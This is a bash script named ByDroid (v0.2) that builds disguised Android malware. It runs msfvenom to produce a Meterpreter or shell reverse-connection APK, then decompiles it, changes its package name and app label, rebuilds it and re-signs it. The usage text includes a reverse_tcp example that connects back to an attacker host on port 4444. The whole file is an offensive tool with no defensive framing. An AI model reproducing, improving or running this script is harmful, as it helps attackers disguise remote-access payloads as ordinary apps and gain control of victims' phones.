#!/bin/bash
# ByDroid
# Written by Tuxt
# Version 0.2 - 01/Oct/2016

# Constants
readonly VERSION=0.2
readonly SHORTOPTS="hgP:l:p:n:i:o:"
readonly LONGOPTS="help,generate,payload:,lhost:,port:,name:,icon:,output:"
readonly REGEX_PAYLOAD="^android/(meterpreter|shell)/reverse_(http[s]{,1}|tcp)$"
readonly REGEX_NUMERIC="^[0-9]+$"

# Vars
generate=false
payload=
lhost=
port=
name=
icon=
output=$(pwd)/out.apk
package=
file=

# Function: print usage
function print_usage() {
    printf "$(tput bold)ByDroid v.$VERSION$(tput sgr0)\n"
    printf "Usage: $0 [options] package [file]\n"
    printf "OPTIONS:\n"
    printf "  -h, --help                              show this help message and exit\n"
    printf "  -g, --generate                          generate apk with msfvenom\n"
    printf "  -P PAYLOAD, --payload=PAYLOAD           use with -g\n"
    printf "  -l LHOST, --lhost=LHOST                 use with -g\n"
    printf "  -p PORT, --port=PORT                    use with -g\n"
    printf "  -n NAME, --name=NAME                    set the application name\n"
    printf "  -i ICON_FILE, --icon=ICON_FILE          set new icon\n"
    printf "  -o OUTPUT_FILE, --output=OUTPUT_FILE    set output file\n\n"

    printf "$(tput bold)EXAMPLES$(tput sgr0)\n"
    printf "	$0 -h\n"
    printf "	$0 com.mynewpackage ./original.apk\n"
    printf "	$0 -n 'Custom app' -i /home/peter/file.png -o edited.apk com.mynewpackage ./original.apk\n"
    printf "	$0 -g -P android/shell/reverse_tcp -l 10.0.4.92 -p 4444 -n 'Custom app' -i /home/peter/file.png -o edited.apk com.mynewpackage\n\n"

    printf "$(tput bold)WRITTEN BY Tuxt$(tput sgr0)\n"
    printf "  https://github.com/Tuxt/ByDroid\n"

    exit 0
}

function ok() {
    printf "[  $(tput setaf 2)OK$(tput sgr0)  ]\n"
}
function failed() {
    printf "[$(tput setaf 1)FAILED$(tput sgr0)]\n"
}

function clean() {
    printf "[      ] Cleaning temporal files...\r"
    cd $CURDIR
    rm -r $TMPDIR
    ok
}

# Change label for tag_pattern=$1 with the value=$2
function changeAppLabel() {
    # Search label
    app_line=$(grep -e"$1" AndroidManifest.xml)
    read -ra line_elems <<< "$app_line"
    for i in "${line_elems[@]}"; do
        if [[ "$i" =~ "android:label=" ]]; then
            old_IFS=$IFS
            IFS='"'
            read -ra app_label <<< "$i"
            app_label=${app_label[1]}
            IFS=$old_IFS
        fi
    done
    # Change label (no change strings.xml)
    if [[ -v app_label && $app_label != "" ]]; then		# Application have label
        app_line=$(sed 's/["]/\\\"/g' <<< $app_line)		# Escape "
        new_line=$(sed "s#$app_label#$2#" <<< $app_line)
    elif [[ ${#line_elems[@]} -eq 1 ]]; then			# Case "<application>"
        new_line="<application android:label=\"$2\">"
    else							# Application doesnt have label
        new_line="${line_elems[0]} android:label=\"$2\" ${line_elems[@]:1}"
    fi
    sed -i "s#$app_line#$new_line#" AndroidManifest.xml
    return 0
}

# Change label for n_line=$1 with the value=$2
function changeLineLabel() {
    # Search label
    app_line=$(sed -n ${1}p AndroidManifest.xml)
    read -ra line_elems <<< "$app_line"
    for i in "${line_elems[@]}"; do
        if [[ "$i" =~ "android:label=" ]]; then
            old_IFS=$IFS
            IFS='"'
            read -ra app_label <<< $i
            app_label=${app_label[1]}
            IFS=$old_IFS
        fi
    done
    # Change label (no change strings.xml)
    if [[ -v app_label && $app_label != "" ]]; then		# Application have label
        app_line=$(sed 's/["]/\\\"/g' <<< $app_line)		# Escape "
        new_line=$(sed "s#$app_label#$2#" <<< $app_line)
    elif [[ ${#line_elems[@]} -eq 1 ]]; then			# Case "<application>"
        new_line="<application android:label=\"$2\">"
    else							# Application doesnt have label
        new_line="${line_elems[0]} android:label=\"$2\" ${line_elems[@]:1}"
    fi
    sed -i "s#$app_line#$new_line#" AndroidManifest.xml
    return 0
}

# Change label for activities with category_launcher: new_label=$1
function changeActivityLabel() {
    # Get lines with LAUNCHER
    lines=("$( grep -n -e"category.LAUNCHER" AndroidManifest.xml | cut -f1 -d":" )")
    for e in $lines; do
        # Search activity tag
        while [ $e -gt 0 ]; do
            e=$(( $e - 1 ))
            line=$( sed -n "${e}p" AndroidManifest.xml )
            if [[ $line == *"<activity"* ]]; then
                changeLineLabel $e "$1"
                break
            fi
        done
    done
}

# Check dependencies
# TODO Prompt for path to bins
# TODO List the missing dependencies
command -v apktool        > /dev/null &&
#command -v d2j-dex2jar    > /dev/null &&
#command -v d2j-jar2jasmin > /dev/null &&
#command -v d2j-jasmin2jar > /dev/null &&
#command -v d2j-jar2dex    > /dev/null &&
command -v d2j-apk-sign   > /dev/null  || {
    printf "$0: Dependencies not found. Check the files:
	apktool
	d2j-apk-sign\n" >&2
#	d2j-dex2jar
#	d2j-jar2jasmin
#	d2j-jasmin2jar
#	d2j-jar2dex
    exit 9
}


# Check parameters
param=`getopt -o $SHORTOPTS --long $LONGOPTS -n "$0" -- "$@"`
eval set -- "$param"

while true; do
    case "$1" in
        -h|--help)
            print_usage
            shift 1;;

        -g|--generate)
            generate=true
            shift 1;;

        -P|--payload)
            if [[ ! $2 =~ $REGEX_PAYLOAD ]]; then
                printf "$0: ($1) Invalid payload argument\n" >&2
                exit 2
            fi
            payload=$2
            shift 2;;

        -l|--lhost)
            lhost=$2
            shift 2;;

        -p|--port)
            if [[ ! $2 =~ $REGEX_NUMERIC ]]; then
                printf "$0: ($1) Port argument is not numeric\n" >&2
                exit 3
            fi
            port=$2
            if [[ $port -gt 65535 ]]; then
                printf "$0: ($1) Port agument out of rangei\n" >&2
                exit 4
            elif [[ $port -lt 1024 || $port -gt 49151 ]]; then
                printf "$0: ($1) WARNING: $port is not a registered port (1024-49151)\n" >&2
            fi
            shift 2;;

        -n|--name)
            name=$2
            shift 2;;

        -i|--icon)
            if [[ $2 == /* ]]; then
                icon=$2
            else
                icon=$(pwd)/$2
            fi
            if [[ ! -f $icon ]]; then
                printf "$0: ($1) File not found or is not a regular file\n" >&2
                exit 5
            fi
            shift 2;;

        -o|--output)
            if [[ $2 == /* ]]; then
                output=$2
            else
                output=$(pwd)/$2
            fi
            shift 2;;

        --)
            # Get params
            package=$2
            file=$3
            shift 3;

            # Check needed params
            if $generate && [[ $package == "" ]] || ! $generate && [[ $package == "" || $file == "" ]]; then
                printf "$0: No given package or input file\n" >&2
                exit 6
            fi

            # If input file used, check path and file
            if ! $generate; then
                if [[ $file != /* ]]; then
                    file=$(pwd)/$file
                fi
                if [[ ! -f $file ]]; then
                    printf "$0: Input file not found or is not a regular file\n" >&2
                    exit 7
                fi
            fi
            break;;

        *)
            printf "$0: Unexpected error\n" >&2
            exit 1
    esac

done


if $generate ; then
    # Check dependencies
    command -v msfvenom > /dev/null || {
        printf "$0: Option -g requires msfvenom\n" >&2
        # TODO Prompt for path to bin
        exit 10
    }
    
    # Check parameters
    if [[ $payload == "" || $lhost == "" || $port == "" ]]; then
        printf "$0: Option -g requires options -P, -l and -p\n" >&2
        exit 8
    fi
fi

# Lets work
readonly CURDIR=$(pwd)
readonly TMPDIR=$(mktemp -d)
cd $TMPDIR

# Generate apk if needed
if $generate; then
    printf "[      ] Generating apk...\r"
    msfvenom -p $payload host=$lhost lport=$port -f raw -o temp.apk &> /dev/null || {
        failed
        printf "$0: Error generating apk\n" >&2
        clean
        exit 11
    }
    file=$TMPDIR/temp.apk
    ok
fi

# Unpack file
printf "[      ] Decoding apk...\r"
apktool -o extracted d $file &> /dev/null || {
    failed
    printf "$0: Error decoding apk\n" >&2
    clean
    exit 12
}
ok
cd extracted

# Search package
printf "[      ] Identifying package...\r"
package_line=$(grep AndroidManifest.xml -e package)
read -ra line_elems <<< "$package_line"
for i in "${line_elems[@]}"; do
    if [[ "$i" =~ "package=" ]]; then
        old_IFS=$IFS
        IFS='"'
        read -ra original_package <<< $i
        original_package=${original_package[1]}
        IFS=$old_IFS
    fi
done

# Check if found
if [[ ! -v original_package || $original_package == "" ]]; then
    failed
    printf "$0: Cannot identify the original package\n" >&2
    clean
    exit 13
fi
ok

# Change package
printf "[      ] Changing package in sources...\r"
original_package_escaped=$(sed 's/[\.]/\\&/g' <<< $original_package)
new_package_escaped=$(sed 's/[\.]/\\&/g' <<< $package)
#find $(pwd) -type f -print0 | xargs -0 sed -i 's/$original_package_escaped/$new_package_escaped/g'
find $(pwd) -type f -print0 | xargs -0 sed -i 's/'"$original_package_escaped"'/'"$new_package_escaped"'/g'

original_package_slashed=${original_package//\./\/}
new_package_slashed=${package//\./\/}
original_package_slashed_escaped=$(sed 's/[\/]/\\&/g' <<< $original_package_slashed)
new_package_slashed_escaped=$(sed 's/[\/]/\\&/g' <<< $new_package_slashed)
#find $(pwd) -type f -print0 | xargs -0 sed -i 's/$original_package_slashed_escaped/$new_package_slashed_escaped/g'
find $(pwd) -type f -print0 | xargs -0 sed -i 's/'"$original_package_slashed_escaped"'/'"$new_package_slashed_escaped"'/g'
ok

# Rename package dir
printf "[      ] Renaming package...\r"
cd smali
mkdir -p $new_package_slashed
mv $original_package_slashed/* $new_package_slashed
cd ..
ok

# TODO Rename app
if [[ -v name && "$name" != "" ]]; then
    printf "[      ] Renaming application...\r"
    changeAppLabel '<application' "$name"
    changeActivityLabel "$name"
fi

# TODO Change icon

# Pack file
printf "[      ] Rebuilding apk...\r"
cd ..
apktool b extracted -o edited.apk &> /dev/null || {
    failed
    printf "$0: Error building apk\n"
    clean
    exit 14
}
ok

# Sign file
printf "[      ] Signing apk...\r"
d2j-apk-sign edited.apk -o $output &> /dev/null || {
    failed
    printf "$0: Error signing apk\n"
    clean
    exit 15
}
ok

# Out
clean

printf "[ $(tput setaf 2)DONE$(tput sgr0) ]\n"
exit 0

